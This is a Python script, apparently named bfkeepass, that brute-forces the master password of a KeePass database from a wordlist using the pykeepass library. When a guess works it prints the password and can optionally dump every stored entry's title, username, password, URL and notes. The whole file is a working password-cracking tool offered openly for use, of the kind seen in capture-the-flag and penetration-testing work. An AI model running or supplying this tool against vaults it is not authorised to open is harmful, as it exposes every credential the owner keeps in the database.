import argparse
from pykeepass import PyKeePass

def main():
	argParser = argparse.ArgumentParser()
	argParser.add_argument("-d", "--database", type=ascii, help="Keepass database file", required=True)
	argParser.add_argument("-w", "--wordlist", type=ascii, help="Wordlist to use", required=True)
	argParser.add_argument("-o", "--output", help="Output entries on success? (true/false)", action="store_true")
	#argParser.add_argument("-l", "--log", help="Log output to a file", action="store_true")
	argParser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
	args = argParser.parse_args()

	databaseFile = args.database.replace("'", "")
	wordlistFile = args.wordlist.replace("'", "")
	outputEntries = args.output
	verboseOutput = args.verbose

	print(f"[*] Running bfkeepass")
	if(verboseOutput):
		print(f"[>] Running against database: {databaseFile}")
		print(f"[>] Using wordlist: {wordlistFile}")
		print("[>] Opening wordlist...")

	try:
		with open(wordlistFile, 'r', encoding='unicode_escape') as file:
			if(verboseOutput):
				print("[>] Successfully opened wordlist.")
			print("[*] Starting bruteforce process...")
			#for line in file:
			for index, line in enumerate(file):
				passwordValue=line.strip()
				if(verboseOutput):
					if((index % 10) == 0):
						print(f"[>] Testing value: ({passwordValue})")
				try:
					# load database (https://github.com/libkeepass/pykeepass)
					kp = PyKeePass(databaseFile, password=passwordValue)
					print(f"[!] Success! Database password: {passwordValue}")
					if(outputEntries):
						print("[>] Dumping entries...")
						print("-" * 20)
						for entry in kp.entries:
							print(f"[>] Title: {entry.title}")
							print(f"[>] Username: {entry.username}")
							print(f"[>] Password: {entry.password}")
							print(f"[>] URL: {entry.url}")
							print(f"[>] Notes: {entry.notes}")
							print("-" * 20)					
						print("[>] Entry dump complete.")
					print("[*] Stopping bruteforce process.")
					break
				except:
					# capture the exception and keep it moving
					continue
	except FileNotFoundError:
		print(f"[ERROR]: The file {wordlistFile} was not found.")
	except Exception as e:
		print(f"[ERROR]: An error occurred while attempting to load {wordlistFile}: {e}")
	print("[*] Done.")

if __name__ == '__main__':
	main()
